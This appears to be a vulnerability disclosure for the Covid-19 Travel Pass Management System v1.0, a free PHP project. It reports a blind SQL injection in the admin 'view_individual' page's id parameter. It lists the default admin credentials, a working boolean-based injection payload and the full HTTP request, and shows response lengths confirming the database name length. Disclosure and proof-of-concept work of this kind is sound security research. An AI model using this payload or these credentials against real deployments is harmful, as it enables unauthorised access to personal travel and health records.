# Covid-19 Travel Pass Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/admin/?page=individuals/view_individual&id=

Vulnerability location: /ctpms/admin/?page=individuals/view_individual&id=,id

[+] Payload: /ctpms/admin/?page=individuals/view_individual&id=2%27%20and%20length(database())%20=8--+ // Leak place ---> id

Current database name: ctpms_db,length is 8

```sql
GET /ctpms/admin/?page=individuals/view_individual&id=2%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close
```
When length (database ()) = 7, Content-Length: 25684
![image](https://user-images.githubusercontent.com/54017627/167081321-587f5447-cfde-4e1e-b200-592966b2f6a4.png)

![image](https://user-images.githubusercontent.com/54017627/167081426-18ea5456-1581-46f9-9817-f12f8ddf0057.png)

When length (database ()) = 8, Content-Length: 25828

![image](https://user-images.githubusercontent.com/54017627/167081297-910a3484-9a86-4a5d-9219-2b5fa6236578.png)

![image](https://user-images.githubusercontent.com/54017627/167081351-9ff910d8-378d-4b23-8357-2e80efd28575.png)
